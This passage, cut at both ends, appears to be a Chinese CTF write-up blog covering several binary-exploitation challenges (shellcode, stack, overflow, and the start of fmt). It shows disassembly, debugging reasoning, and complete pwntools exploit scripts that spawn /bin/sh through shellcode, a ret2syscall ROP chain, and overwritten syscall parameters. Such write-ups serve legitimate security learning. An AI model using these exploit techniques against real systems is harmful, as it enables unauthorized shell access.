class="number">8</span>)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/pwn/桌面/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>题目提示够用了仔细看寄存器</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello hacker&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to show your strength &quot;</span>);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">18uLL</span>);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000</span>uLL, <span class="number">4</span>);</span><br><span class="line">  sub_11C9(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf位于栈上被改为可读可写可执行，后续buf作为参数被传入rdi中调用sub_11C9函数，汇编如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011C9 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:00000000000011CD 55                            push    rbp</span><br><span class="line">.text:00000000000011CE 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000000011D1 41 57                         push    r15</span><br><span class="line">.text:00000000000011D3 41 56                         push    r14</span><br><span class="line">.text:00000000000011D5 41 55                         push    r13</span><br><span class="line">.text:00000000000011D7 41 54                         push    r12</span><br><span class="line">.text:00000000000011D9 53                            push    rbx</span><br><span class="line">.text:00000000000011DA 48 89 7D D0                   mov     [rbp+var_30], rdi</span><br><span class="line">.text:00000000000011DE 48 8B 7D D0                   mov     rdi, [rbp+var_30]</span><br><span class="line">.text:00000000000011E2 48 31 C0                      xor     rax, rax</span><br><span class="line">.text:00000000000011E5 48 31 DB                      xor     rbx, rbx</span><br><span class="line">.text:00000000000011E8 48 31 C9                      xor     rcx, rcx</span><br><span class="line">.text:00000000000011EB 48 31 D2                      xor     rdx, rdx</span><br><span class="line">.text:00000000000011EE 48 31 F6                      xor     rsi, rsi</span><br><span class="line">.text:00000000000011F1 4D 31 C0                      xor     r8, r8</span><br><span class="line">.text:00000000000011F4 4D 31 C9                      xor     r9, r9</span><br><span class="line">.text:00000000000011F7 4D 31 D2                      xor     r10, r10</span><br><span class="line">.text:00000000000011FA 4D 31 DB                      xor     r11, r11</span><br><span class="line">.text:00000000000011FD 4D 31 E4                      xor     r12, r12</span><br><span class="line">.text:0000000000001200 4D 31 ED                      xor     r13, r13</span><br><span class="line">.text:0000000000001203 4D 31 F6                      xor     r14, r14</span><br><span class="line">.text:0000000000001206 4D 31 FF                      xor     r15, r15</span><br><span class="line">.text:0000000000001209 48 31 ED                      xor     rbp, rbp</span><br><span class="line">.text:000000000000120C 48 31 E4                      xor     rsp, rsp</span><br><span class="line">.text:000000000000120F 48 89 FF                      mov     rdi, rdi</span><br><span class="line">.text:0000000000001212 FF E7                         jmp     rdi</span><br><span class="line">.text:0000000000001212</span><br><span class="line">.text:0000000000001212                               sub_11C9 endp</span><br></pre></td></tr></table></figure>

<p>会将除RDI RIP外的所有寄存器清零故在设置execve(‘&#x2F;bin&#x2F;sh,0,0’)时我们不用管rsi和rdx，只用看rdi和rax就好了，关键在于如何让rdi的值为&#x2F;bin&#x2F;sh的地址，<strong>注意只能是&#x2F;bin&#x2F;sh的地址</strong>，因为execve的各个参数都是指针，如果直接将&#x2F;bin&#x2F;sh这个具体字符赋值给rdi函数会无法解析，选择将&#x2F;bin&#x2F;sh写在buf上，然后通过rsp传递&#x2F;bin&#x2F;sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea rsp, [rdi + 11]   ;4字节将rdi指向的地址加上 11后的结果赋值给rsp(刚好指向/bin/sh)</span><br><span class="line">mov rdi,rsp           ;3字节将rsp的值赋给rdi  </span><br><span class="line">mov al,0x3b			 ;2字节将rax的值设置为0x3b</span><br><span class="line">syscall               ;2字节系统调用</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node2.tgctf.woooo.tech&#x27;</span>,<span class="number">30243</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lea rsp, [rdi + 11]  </span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov al,0x3b</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = shellcode+ <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>新姿势：lea用于计算内存地址并将结果存储在目标寄存器中，相较于先add再mov更省字节</strong></p>
</blockquote>
<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>checksec</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn            </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;welcome! could you tell me your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_404060, <span class="number">0xA8uLL</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;what dou you want to say?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_4011FA</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_4011FA()函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">sub_4011FA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+48h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_read</span>(<span class="number">0</span>, buf, <span class="number">0x50uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> retaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_4011FA()函数很明显存在栈溢出但是要构造rop链来泄露libc明显不太够main函数中还有个read可以读很多数据到data段</p>
<p>data段从unk_404060开始</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000404060 00                            unk_404060 db    0                      ; DATA XREF: main+62↑o</span><br><span class="line">.data:0000000000404061 00                            db    0</span><br><span class="line">.data:0000000000404062 00                            db    0</span><br><span class="line">.data:0000000000404063 00                            db    0</span><br><span class="line">.data:0000000000404064 00                            db    0</span><br><span class="line">.data:0000000000404065 00                            db    0</span><br><span class="line">.data:0000000000404066 00                            db    0</span><br><span class="line">.data:0000000000404067 00                            db    0</span><br><span class="line">.data:0000000000404068 00                            db    0</span><br><span class="line">.data:0000000000404069 00                            db    0</span><br><span class="line">.data:000000000040406A 00                            db    0</span><br><span class="line">.data:000000000040406B 00                            db    0</span><br><span class="line">.data:000000000040406C 00                            db    0</span><br><span class="line">.data:000000000040406D 00                            db    0</span><br><span class="line">.data:000000000040406E 00                            db    0</span><br><span class="line">.data:000000000040406F 00                            db    0</span><br><span class="line">.data:0000000000404070 00                            db    0</span><br><span class="line">.data:0000000000404071 00                            db    0</span><br><span class="line">.data:0000000000404072 00                            db    0</span><br><span class="line">.data:0000000000404073 00                            db    0</span><br><span class="line">.data:0000000000404074 00                            db    0</span><br><span class="line">.data:0000000000404075 00                            db    0</span><br><span class="line">.data:0000000000404076 00                            db    0</span><br><span class="line">.data:0000000000404077 00                            db    0</span><br><span class="line">.data:0000000000404078 00                            db    0</span><br><span class="line">.data:0000000000404079 00                            db    0</span><br><span class="line">.data:000000000040407A 00                            db    0</span><br><span class="line">.data:000000000040407B 00                            db    0</span><br><span class="line">.data:000000000040407C 00                            db    0</span><br><span class="line">.data:000000000040407D 00                            db    0</span><br><span class="line">.data:000000000040407E 00                            db    0</span><br><span class="line">.data:000000000040407F 00                            db    0</span><br><span class="line">.data:0000000000404080 00                            db    0</span><br><span class="line">.data:0000000000404081 00                            db    0</span><br><span class="line">.data:0000000000404082 00                            db    0</span><br><span class="line">.data:0000000000404083 00                            db    0</span><br><span class="line">.data:0000000000404084 00                            db    0</span><br><span class="line">.data:0000000000404085 00                            db    0</span><br><span class="line">.data:0000000000404086 00                            db    0</span><br><span class="line">.data:0000000000404087 00                            db    0</span><br><span class="line">.data:0000000000404088 00                            db    0</span><br><span class="line">.data:0000000000404089 00                            db    0</span><br><span class="line">.data:000000000040408A 00                            db    0</span><br><span class="line">.data:000000000040408B 00                            db    0</span><br><span class="line">.data:000000000040408C 00                            db    0</span><br><span class="line">.data:000000000040408D 00                            db    0</span><br><span class="line">.data:000000000040408E 00                            db    0</span><br><span class="line">.data:000000000040408F 00                            db    0</span><br><span class="line">.data:0000000000404090 00                            db    0</span><br><span class="line">.data:0000000000404091 00                            db    0</span><br><span class="line">.data:0000000000404092 00                            db    0</span><br><span class="line">.data:0000000000404093 00                            db    0</span><br><span class="line">.data:0000000000404094 00                            db    0</span><br><span class="line">.data:0000000000404095 00                            db    0</span><br><span class="line">.data:0000000000404096 00                            db    0</span><br><span class="line">.data:0000000000404097 00                            db    0</span><br><span class="line">.data:0000000000404098 00                            db    0</span><br><span class="line">.data:0000000000404099 00                            db    0</span><br><span class="line">.data:000000000040409A 00                            db    0</span><br><span class="line">.data:000000000040409B 00                            db    0</span><br><span class="line">.data:000000000040409C 00                            db    0</span><br><span class="line">.data:000000000040409D 00                            db    0</span><br><span class="line">.data:000000000040409E 00                            db    0</span><br><span class="line">.data:000000000040409F 00                            db    0</span><br><span class="line">.data:00000000004040A0 01 00 00 00 00 00 00 00       qword_4040A0 dq 1                       ; DATA XREF: sub_4011FA-2A↑r</span><br><span class="line">.data:00000000004040A8                               ; unsigned int fd</span><br><span class="line">.data:00000000004040A8 01 00 00 00 00 00 00 00       fd dq 1                                 ; DATA XREF: sub_4011FA-23↑r</span><br><span class="line">.data:00000000004040B0 00                            db    0</span><br><span class="line">.data:00000000004040B1 00                            db    0</span><br><span class="line">.data:00000000004040B2 00                            db    0</span><br><span class="line">.data:00000000004040B3 00                            db    0</span><br><span class="line">.data:00000000004040B4 00                            db    0</span><br><span class="line">.data:00000000004040B5 00                            db    0</span><br><span class="line">.data:00000000004040B6 00                            db    0</span><br><span class="line">.data:00000000004040B7 00                            db    0</span><br><span class="line">.data:00000000004040B8                               ; size_t count</span><br><span class="line">.data:00000000004040B8 0B 00 00 00 00 00 00 00       count dq 0Bh                            ; DATA XREF: sub_4011FA-19↑r</span><br><span class="line">.data:00000000004040C0                               ; char buf[72]</span><br><span class="line">.data:00000000004040C0 00 00 00 00 00 00 00 00 00 00+buf db 48h dup(0)                       ; DATA XREF: sub_4011FA-3C↑o</span><br><span class="line">.data:00000000004040C0 00 00 00 00 00 00 00 00 00 00+                                        ; sub_4011FA-31↑o</span><br><span class="line">.data:0000000000404108 2F 62 69 6E 2F 73 68 00       aBinSh db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure>

<p>发现了&#x2F;bin&#x2F;sh地址，先记录后续应该用的上，溢出字节数够我们可以覆盖很多内容：qword_4040A0 dq 1；fd dq 1 ；count dq 0Bh 这三个参数很可疑汇编里找找它在哪</p>
<p>sub_4011FA</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG1.png" alt="1"></p>
<p>发现当[rbp+8]处的内容和[rbp+0x28]处的内容不一样时会跳转到<code>loc_4011B6</code>这个函数</p>
<p>找到这个函数就在sub_4011FA汇编的上面，但是没有对应的函数名称所以在左侧函数名称栏看不到</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG2.png" alt="1"></p>
<p>发现了刚刚我们可以覆盖的那几个参数，分别对应rax ，rdi，rdx，其中通过gdb调试发现rsi的地址是指向0的指针，所以我们可以通过第一个read来覆盖特定参数达到execve(‘&#x2F;bin&#x2F;sh,0,0’)</p>
<p>当[rbp+8]处的内容和[rbp+0x28]处的内容不一样时才会跳转到<code>loc_4011B6</code>这个函数，在未栈溢出覆盖时这两个地方的值是一样的所以我们要覆盖掉rbp+8处的内容使函数能正常跳转</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">30764</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bin_sh=<span class="number">0x404108</span></span><br><span class="line"></span><br><span class="line">qword_4040A0_offset = <span class="number">0x40</span>  <span class="comment"># 64 字节</span></span><br><span class="line">fd_offset = <span class="number">0x48</span>            <span class="comment"># 72 字节</span></span><br><span class="line">count_offset = <span class="number">0x58</span></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * qword_4040A0_offset  <span class="comment"># 填充到 qword_4040A0 的偏移量</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)                  <span class="comment"># 写入 0x3b</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * (fd_offset - qword_4040A0_offset - <span class="number">8</span>)  <span class="comment"># 填充到 fd 的偏移量</span></span><br><span class="line">payload += p64(<span class="number">0x404108</span>)              <span class="comment"># 写入 0x404108</span></span><br><span class="line">payload += <span class="string">b&#x27;C&#x27;</span> * (count_offset - fd_offset - <span class="number">8</span>)         <span class="comment"># 填充到 count 的偏移量</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000000000</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>)+<span class="string">b&#x27;12345678&#x27;</span>*<span class="number">2</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;want to say?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>checksec</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>check版本老了，实际上没开canary因为静态编译所以误检测了，程序是静态编译的，两段输入第一段通过read读到bss段上可以读0x100个字节，第二段gets读入栈上可以栈溢出控制执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+0h] [ebp-D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+C8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i heard you love gets,right?&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目前思路在name处写下rop链进行ret2syscall系统调用execve(‘&#x2F;bin&#x2F;sh’,0,0)，gets处构造溢出控制执行流即可</p>
<p>因为是全静态编译，gets函数也是静态构造的没有link，所以通过gdb调试进入到gets函数来找偏移</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG4.png" alt="1"></p>
<p>前面还有一个  _uflow 函数调用获取一个字符所以我们的输入起始地址是0xfffd048继续调式</p>
<p>可以看到运行到gets函数结束时旧的ebp在0xffffd118处距离输入即为0xD0这个数据和IDA上的相同但是想要控制执行流并不能将返回地址覆盖在0xD0+4+4处因为main函数汇编ret这里有点不一样</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG3.png" alt="1"></p>
<p>我们先找esp因为最后retn是pop eip将esp指向的地址弹给执行流，来到080498C0处也就是<code>lea esp,[ebp - 8]</code>ebp是我们可控的，esp现在的地址是[ebp - 8]处紧接着<code>pop ecx</code>将该处前4个字节弹给ecx后面还要弹两个但是用处不大，就到了0x080498C6处<code>lea esp,[ecx - 4]</code>此时esp的值被改为了[ecx - 4]也就是[ebp - 8 -4]处所以我们要将返回地址放到[ebp-8]处才能跳转且返回地址的值要加4才是正确的返回地址</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">31579</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=<span class="number">0x080EF320</span></span><br><span class="line"></span><br><span class="line">int_80=<span class="number">0x08073D70</span></span><br><span class="line">pop_eax=<span class="number">0x080b470a</span></span><br><span class="line">pop_ebx=<span class="number">0x08049022</span></span><br><span class="line">pop_ecx=<span class="number">0x08049802</span></span><br><span class="line">pop_edx=<span class="number">0x08060bd1</span></span><br><span class="line">bin_sh=name</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_ebx)+p32(bin_sh)+p32(pop_ecx)+p32(<span class="number">0</span>)+p32(pop_edx)+p32(<span class="number">0</span>)+p32(int_80)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xD0</span>-<span class="number">0x8</span>)+p32(name+<span class="number">0x4</span>+<span class="number">0x8</span>) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;right?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p> p32(name+0x4+0x8)加4上面已经讲了，加8是为了跳过<code>/bin/sh\x00</code>‘占8字节 </p>
<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>利用格式化字符漏洞任意写</p>
<p>checksec</p>
